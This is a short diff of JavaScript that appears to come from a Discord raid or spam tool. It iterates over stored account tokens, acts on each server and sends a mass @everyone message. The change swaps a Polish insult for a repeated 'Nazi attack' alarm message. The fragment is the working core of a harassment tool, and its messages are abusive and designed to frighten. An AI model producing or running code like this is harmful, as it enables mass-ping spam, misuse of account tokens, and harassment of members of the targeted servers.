@@ -25,7 +25,7 @@ for (const token of auth.tokens) {
 							id: guild.id,
 						}],
 					});
-					await shit.send('Kiciuś zjeb @everyone');
+					await shit.send('ATAK HITLEROWCÓW @everyone ATAK HITLEROWCÓW');
 				} catch (err) {
 					console.error(err);
 				}
